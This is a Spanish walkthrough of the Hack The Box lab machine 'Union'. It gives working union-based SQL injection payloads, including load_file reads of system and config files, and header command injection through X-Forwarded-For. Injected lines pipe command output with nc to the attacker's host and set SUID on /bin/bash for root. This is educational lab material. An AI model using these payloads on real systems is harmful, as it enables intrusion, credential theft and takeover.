---
title: Union WriteUp
date: 2023-04-19
categories: [WriteUps, Máquinas Linux]
tags: [SQLi, Curl, RCE, nc]
image:
  path: ../../assets/img/writeups/Union/union.png
  width: 528
  height: 340
  alt: Banner Union
---

En el reconocimiento encuentro el puerto 80/http abierto. En la web hay un input vulnerable a SQLi. Consigo ver usuarios (/etc/passwd) y una flag que me pedían en la web, indicando la flag te abren el puerto ssh de la máquina. Gracias a un fuzzing buscando por archivos con extensión php también podemos visualizar un config.php donde visualizo la contraseña de un usuario. Con el puerto 22/ssh ahora abierto y estas credenciales ingresamos en la máquina objetivo.

Para la escalada también aprovechamos el fuzzing mencionado antes, ya que habíamos encontrado un firewall.php, en él se llama al comando **system** y se ejecuta en parte lo que introduza en la cabecera, aprovechemos para introducir un comando y "escalar" al usuario www-data el cual tiene un privilegio de sudoers total.

## Reconocimiento

Hoy pentestearemos la máquina Union con ip `10.10.11.128`.

Lo primero es lo primero, comprobaré si hay conectividad con la máquina.
```
❯ ping -c 1 10.10.11.128
PING 10.10.11.128 (10.10.11.128) 56(84) bytes of data.
64 bytes from 10.10.11.128: icmp_seq=1 ttl=63 time=49.0 ms

--- 10.10.11.128 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 48.973/48.973/48.973/0.000 ms
```
Un paquete enviado, un paquete recibido, perfecto.

Toca averiguar que puertos de la máquina están abiertos para poder atacar a estos.
```
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.128 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-16 16:22 CEST
Initiating SYN Stealth Scan at 16:22
Scanning 10.10.11.128 [65535 ports]
Discovered open port 80/tcp on 10.10.11.128
Completed SYN Stealth Scan at 16:23, 26.39s elapsed (65535 total ports)
Nmap scan report for 10.10.11.128
Host is up, received user-set (0.049s latency).
Scanned at 2023-04-16 16:22:53 CEST for 27s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
           Raw packets sent: 131089 (5.768MB) | Rcvd: 21 (924B)
```

Esto significan las opciones:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.11.128 : Dirección IP objetivo, la cual quiero escanear
* -oG allPorts : Exportará el output a un fichero grepeable que llamaremos "allPorts"

He encontrado el puerto 80 abierto. Quiero algo más de información sobre el puerto descubierto:
```
❯ nmap -p80 -sC -sV 10.10.11.128 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-16 16:26 CEST
Nmap scan report for 10.10.11.128
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.60 seconds
```
* -sC : Lanza unos scrips básicos de reconocimiento.
* -sV : Para averiguar la versión de los servicios.

La versión del servicio 80, la versión del server es un nginx 1.18.0. Si buscamos en searchsploit por esta versión no encontramos nada.

Lanzaré la herramienta **whatweb** para analizar las tecnologías que corren en la web desde la terminal.
```
❯ whatweb http://10.10.11.128
http://10.10.11.128 [200 OK] Bootstrap[4.1.1], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.128], JQuery[3.2.1], Script, nginx[1.18.0]
```
Poquito más averiguamos con esto.

## Buscando vulnerabilidades

Como solo tenemos un puerto abierto, el 80, empezaremos indudablemente por este.

Veamos que pinta tiene.

![Web]({{ 'assets/img/writeups/Union/web.png' | relative_url }}){: .center-image }

Me da en la nariz que viendo ese cuadro de input y llamandose union la caja podría haber un ataque SQLi a la vista, la palabra union se usa para algunas inyecciones. Tengo la costumbre, que no viene nada mal, de hacer un fuzzing básico primero. Luego intento ese SQLi.

```
❯ dirsearch -u http://10.10.11.128 -x 403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.11.128/_23-04-16_16-48-12.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-04-16_16-48-12.log

Target: http://10.10.11.128/

[16:48:12] Starting: 
[16:48:29] 200 -    0B  - /config.php
[16:48:30] 301 -  178B  - /css  ->  http://10.10.11.128/css/
[16:48:34] 200 -    1KB - /index.php

Task Completed
<dirsearch.dirsearch.Program object at 0x7fb3916a5a60>
```
Lanzo también un wfuzz pero encuentro el subidrectorio /css y ya esta. No dejo que pruebe todo el diccionario por mmm falta de paciencia y que creo que la resolución no va por aquí, y si fuera ya hubiera encontrado algún subdirectorio más. Podría lanzar otro wfuzz buscando por archivos php y txt peeero voy a probar ya la inyección sql.

Antes de abrir el bursuite pruebo que hace la página. Meto en el recuadro un nombre y me da las felicitaciones, me comenta que puedo participar en un torneo.

![Congratulations]({{ 'assets/img/writeups/Union/felicidades.png' | relative_url }}){: .center-image }

**Probando SQLi**: 

Abajo en el "click" te lleva a challenge.php y te pide una flag, la cual no tengo. No da ningún tipo de error o mensaje si pongo una flag erronea.

Me abro el burpsuite y marco "intercept in on". Interceptaré las peticiones y lanzaré las inyecciones desde el BurpSuite.

![Burpsuite-1]({{ 'assets/img/writeups/Union/burpOn.png' | relative_url }}){: .center-image }

Desde el navegador de firefox y con la extensión de foxyproxy instalada tienes que activar un proxy que ya hayas configurado. Simplemente tienes que poner como ProxyIp la local; 127.0.0.1 y como puerto; 8080. Esa es toda la configuración.

Una vez interceptada la petición lo mando a la pestaña del Repeater dentro del Burpsuite. esta pestaña va muy bien para enviar cómodamente la petición y ver la respuesta justo al lado.

## Explotación

Lanzo unas inyecciones, la típica de `admin' or 1=1-- -` y las "order by", con estas me sale la misma respuesta que en la web. Pero si pruebo la inyección union se muestra algo distinto:

![Sqli_1]({{ 'assets/img/writeups/Union/sqli_1.png' | relative_url }}){: .center-image }

Tiene toda la pinta que la explotación va ir por aquí.

Como se ve en la foto, si pongo el número 1 en union select(una columna) sale este mensaje "Sorry, 1 you are not eligible due to already qualifying.". Probaré con más números en órden ascendente; `admin' union select 1,2-- -` con este y siguientes vuelve a salir el mensaje primero de "Congratulations..", así que deduzco que por detrás solo hay una columna, ya que es donde sale un mensaje distinto.

Confirmaré que es vulnerable a SQLi con algún comando básico de información como puede ser @@version o version().

![Sqli_2]({{ 'assets/img/writeups/Union/sqli_2.png' | relative_url }}){: .center-image }

Y sale la versión, en esta ocasión la del sistema operativo. Yo esperaba la de la base da datos pero bueeeno. Aun así, todo perfecto, es vulnerable a SQli tipo Union Based.

Vamos a sacar todo lo que podamos de la base de datos. Estas son las peticiones que mandaré:
```
Todo lo hago desde el BurpSuite, en el campo player:

admin' union select database()-- -
--> Como respuesta a esto me da november. Esta inyección es para sacar la base de datos actual, que en este caso es november.

admin' union select schema_name from information_schema.schemata-- -
--> mysql. Esta inyección es para sacar todas las bases de datos. Si solo sale una posiblemente no pueda sacar más de una vez, entonces puedes usuar el limit o el group_concat. Más cómodo el group_concat. Ejemplos de uso de limit:

admin' union select schema_name from information_schema.schemata limit 0,1-- -
--> mysql

admin' union select schema_name from information_schema.schemata limit 1,1-- -
--> information_schema

admin' union select schema_name from information_schema.schemata limit 4,1-- -
--> november. En total hay 5 bases de datos.

Ejemplo uso de group_concat:

admin' union select group_concat(shcema_name) from informacion_schema.schemata-- -

```
Empezaré por averiguar las tablas y la data de la base de datos que más me interesan, que son november y mysql. Empiezo por november:
``` 
Sigo desde el BurpSuite desde el campo player:

admin' union select table_name from information_schema.tables where table_schema="november" limit 0,1-- -
--> flag. El limit 1,1 es players. Por lo tanto hay dos tablas en november; flag y players.

--> Otra forma más fácil de hacerlo es con el group_concat:
admin' union select group_concat(table_name) from information_schema.tables where table_schema="november"-- -
--> Y saldrían directamente las dos tablas existentes.

admin' union select group_concat(column_name) from information_schema.columns where table_schema="november" and table_name="flag"-- -
--> one. Solo hay una columna llamada one en la tabla flag.

admin' union select group_concat(column_name) from information_schema.columns where table_schema="november" and table_name="players"-- -
--> player. Solo hay una columna llamada player en la tabla players.
--> Ahora saquemos la data final:

admin' union select group_concat(player) from players-- -
--> Salen todos los players registrados.

admin' union select one from flag limit 0,1-- -
--> UHC{F1rst_5tep_2_Qualify} . En el resto de limits no hay nada. Tenemos una flag. Podría hacerse igualmente con el group_concat.
```
Entiendo que esa flag sacada vale para todas las usuarias. Quiero ver en la web que pasa si la introduzco.

![Ssh_Access]({{ 'assets/img/writeups/Union/sshAccess.png' | relative_url }}){: .center-image }

Parece ser que ahora nuestra ip puede conectarse por ssh al equipo (si tenemos credenciales). Antes el puerto 22/ssh no estaba abierto. Ahora entiendo que si que estará. Puse el usuario **guise** como player antes del mensaje este, podria haber sido cualquier otro.

```
❯ nmap --open -p22 -v 10.10.11.128
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-16 18:24 CEST
Initiating Ping Scan at 18:24
Scanning 10.10.11.128 [4 ports]
Completed Ping Scan at 18:24, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:24
Completed Parallel DNS resolution of 1 host. at 18:24, 0.01s elapsed
Initiating SYN Stealth Scan at 18:24
Scanning 10.10.11.128 [1 port]
Discovered open port 22/tcp on 10.10.11.128
Completed SYN Stealth Scan at 18:24, 0.07s elapsed (1 total ports)
Nmap scan report for 10.10.11.128
Host is up (0.050s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
           Raw packets sent: 5 (196B) | Rcvd: 2 (84B)
```
¡Y si!. Ahora está abierto. Voy a probar la contraseña: UHC{F1rst_5tep_2_Qualify} para usuario guise. Pero casi seguro que no, dudo mucho que se haya creado un usuario a nivel de sistema con el player guise que he introducido en la web.
``` 
> ssh guise@10.10.11.128
```
Pero como había pensado, no funciona. Podría probar con otros players, pero no. Prefiero sacar users y passwords de la base de datos mysql. Quizás se reciclen contraseñas para ssh.

```
Desde burpsuite, en el campo players:

admin' union select group_concat(table_name) from information_schema.tables where table_schema="mysql"-- -
--> Saldrían todas las tablas metiendo el group_concat. Más fácil. Una de ellas es la tabla "user".

admin' union select group_concat(column_name) from information_schema.columns where table_schema="mysql" and table_name="user"-- -
--> La más intersante es User


admin' union select group_concat(User) from mysql.user-- -
--> uhc. Usuario interesante "uhc" su contraseña podría ser la flag. Pero pruebo y nada.
--> También se podía haber visto ese usuario con la siguiente inyección:
guise' union select user()-- -

--> No encuentro nada interesante más por la tabla user, voy a intentarlo por la tabla db.

admin' union select column_name from information_schema.columns where table_schema="mysql" and table_name="db" limit 2,1-- -
--> User. 
--> Tampoco veo ninguna columna password..
```

Hay un tipo de inyección llamada **load_file**. Intentaré ver algún recurso de la máquina. Y puedo!!!!

![etc_password]({{ 'assets/img/writeups/Union/etcPasswd.png' | relative_url }}){: .center-image }

Podemos cargar recursos de la máquina objetivo. Además vemos un usuario interesante, que también vimos enumerando la base de datos, el usuario **uhc**.

Bien, vamos a ver si tiene id_rsa para poder conectarme por ssh. La instrucción sería en el campo player=`admin' union select load_file("/home/uhc/.ssh/id_rsa")-- -`. Pero nada.. Lo que si puedo ver es la flag de usuario `admin' union select load_file("/home/uhc/user.txt")-- -`.

También está el usuario **htb** lo sabemos por las tty, que suelen ser /bin/bash o /bin/ssh. Pruebo si tiene id_rsa pero tampoco. También intento conectarme por ssh con este usuario y la flag de antes **UHC{F1rst_5tep_2_Qualify}** pero nada.

Aquí me quedo pensando un rato..Lo importante de hacer un buen fuzzing al principio, o al menos, acordarse en este punto que lo puedes hacer mejor. La web interpreta php y nuestro fuzzing para archivos php ha sido inexistente. Ahora que podemos leer archivos de la máquina con **load_file** intentaré sacar toda la info que pueda.
```
❯ wfuzz -c --hc=404 -t 150 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.128/FUZZ.php

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.128/FUZZ.php
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================
                             
000000009:   200        42 L     93 W       1220 Ch     "# Suite 300, San Francisco, California, 94105, USA."                                                                  
000000003:   200        42 L     93 W       1220 Ch     "# Copyright 2007 James Fisher"                                                                                        
000000001:   200        42 L     93 W       1220 Ch     "# directory-list-2.3-medium.txt"                                                                                      
000001490:   200        0 L      0 W        0 Ch        "config"                                                                                                               
000000881:   200        0 L      2 W        13 Ch       "firewall"                                                                                                             
000004099:   200        20 L     61 W       772 Ch      "challenge"                                                                                                            
000017014:   404        7 L      12 W       162 Ch      "0471253111"  
```
Y encuentro los archivos config.php, firewall.php y challenge.php. Este último ya lo conocemos. Ese config tiene buena pinta, desde el bursuite y usando el load_file intento leerlo. Una ruta web típica es **/var/www/html**

![Config]({{ 'assets/img/writeups/Union/config.png' | relative_url }}){: .center-image }

Encontramos una contraseña **uhc-11qual-global-pw** para el usuario **uhc** para lo que parece ser la base de datos. Puede que se reciclen contraseñas y también sea la de acceso vía ssh. Probamos;
```
❯ ssh uhc@10.10.11.128
uhc@10.10.11.128's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  8 21:19:42 2021 from 10.10.14.8
uhc@union:~$
``` 
Estamos dentro.

La flag ya la habíamos conseguido antes mediante la inyección SQL, pero me gusta más cuando la consigo habiendo accedido a la máquina.
```
uhc@union:~$ export TERM=xterm
-->Eso lo primero, para poder hacer Ctrl+L y borrar. Ahora si, leo la primera flag;

uhc@union:~$ cat user.txt
5bd07c84eab22e5f45a9fb*********
````

## Escalada de privilegios


```
uhc@union:~$ id
uid=1001(uhc) gid=1001(uhc) groups=1001(uhc)

uhc@union:~$ sudo -l
[sudo] password for uhc: 
Sorry, user uhc may not run sudo on union.

uhc@union:~$ find / -perm -4000 2>/dev/null
/usr/bin/at
/usr/bin/fusermount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1

uhc@union:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

uhc@union:~$ uname -a
Linux union 5.4.0-77-generic #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux

uhc@union:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.3 LTS
Release:	20.04
Codename:	focal
``` 
Y buscando tareas programadas y cron tampoco hay nada. Abajo dejo los comandos pero no los resultados que son bastante amplios:
```
uhc@union:~$ cat /etc/crontab

uhc@union:~$ systemctl list-timers
````
En los resultados de los comandos anteriores no creo que haya nada porque las tareas programadas son cada 15 minutos y dudo mucho que la máquina solo se pueda escalar cada 15 minutos. No suele ser así..Además que son tareas típicas que salen en muchas máquinas ya vistas.

Ahora o bien podríamos tirar un **linpeas** o pensar un poquito en lo que tenemos. Recuerdo un firewall.php que no he visualizado. Contenido de firewall.php:
``` php
<?php
require('config.php');

if (!($_SESSION['Authenticated'])) {
  echo "Access Denied";
  exit;
}

?>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
		<h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>
		
	</div>
	<section class="bg-dark text-center p-5 mt-4">
		<div class="container p-5">
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
		</div>
	</section>
</div>
```
Veo un comando a nivel de sistema, ni más ni menos que **system**, ¡¡peligrooso!!. Si puedo llegar a introducir algo en esa parte se puede liar.

Entiendo que si mando una petición a este recurso (firewall.php) con la cabecera "HTTP_X_FORWARDED_FOR" el contenido de esta cabecera se guarda en la variable ip. Y esa variable luego se introduce dentro del comando system. Así que porbaré a mandar un comando como valor, usando ";" para escapar del contexto.  
Necesito autorización como se puede ver arriba del todo, se referirán a la cookie que la puedo encontrar tanto en el navegador como en el bursuite.

Usemos curl para esto y desde la máquina víctima mismo. Primero voy a ver si no sale lo de acceso denegado:
```
uhc@union:/var/www/html$ curl -s -X GET http://localhost/firewall.php -H "Cookie: PHPSESSID=kkpgqrbt1sh7rkip8pqr22l15l"
```
Y no me sale el "Access Denied", sale contenido, guay. ¡Ojo cuidado con los dos puntos y el igual en la cookie. es fácil confundirse!!!!.

Ahora meteremos la cabecera y un comando. Me enviaré un ping. El HTTP de la cabecera no hace falta ponerlo..Pongo un ; al final del comando también para escapar del contexto y separar.
```
curl -s -X GET http://localhost/firewall.php -H "X-FORWARDED-FOR: 1.1.1.2.2; ping -c 1 10.10.14.17;" -H "Cookie: PHPSESSID=kkpgqrbt1sh7rkip8pqr22l15l"
```
Y en mi terminal estando en escucha recibo el ping:
```
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:25:48.276561 IP 10.10.11.128 > 10.10.14.17: ICMP echo request, id 2, seq 1, length 64
18:25:48.276586 IP 10.10.14.17 > 10.10.11.128: ICMP echo reply, id 2, seq 1, length 6
```
Es curioso, la puñetera Matrix..Si ponía la cookie de sesion antes que la cabecera en el curl no me funcionaba..yo flipo en colorinchis.

Me gustaría saber con que usuario estoy haciendo esto, así que jugaré con netcat;
```
uhc@union:/var/www/html$ curl -s -X GET http://localhost/firewall.php -H "X-FORWARDED-FOR: 1.1.1.2.2; whoami | nc 10.10.14.17 443;" -H "Cookie: PHPSESSID=kkpgqrbt1sh7rkip8pqr22l15l"
``` 
Y estando en escucha desde mi terminal recibo que soy usuario www-data
``` 
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.128] 58996
www-data
```
Mmmm Así de primeras parece que www-data será un usuario con menos privilegios que uhc, y que en vez de escalar privilegios voy a desescalarlos. Pero con uhc no he visto manera así que habrá que probar con otro usuario. Haré un sudo -l con este usuario a ver que tiene.
```
curl -s -X GET http://localhost/firewall.php -H "X-FORWARDED-FOR: 1.1.1.2.2; sudo -l | nc 10.10.14.17 443;" -H "Cookie: PHPSESSID=kkpgqrbt1sh7rkip8pqr22l15l"
```
Y lo que recibo no me lo esperaba;
```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.128] 59008
Matching Defaults entries for www-data on union:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL
``` 
Puedo correr todo sin contraseña como quien quiera. De perlas. Podría lanzarme una reverse shell como el usuario www-data y luego tirar el comando sudo bash. Pero más fácil va a ser esto:
```
uhc@union:/var/www/html$ curl -s -X GET http://localhost/firewall.php -H "X-FORWARDED-FOR: 1.1.1.2.2; sudo chmod u+s /bin/bash;" -H "Cookie: PHPSESSID=kkpgqrbt1sh7rkip8pqr22l15l"

uhc@union:/var/www/html$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
```
Doy el permiso SUID a /bin/bash para ahora poder ejecutarlo como el propietario que es root;
```
uhc@union:/var/www/html$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
d23f83dd91bfd8638531a24183******
```
Y máquina hecha. Ha estado guay. Me he líado un poco con el curl y tengo que recordar realizar un buen fuzzing si me quedo bloqueado en alguna parte, o hacerlo bien desde el principio.

¡Saludos!, y a quién haya leído esto espero que os haya ayudado.

















 
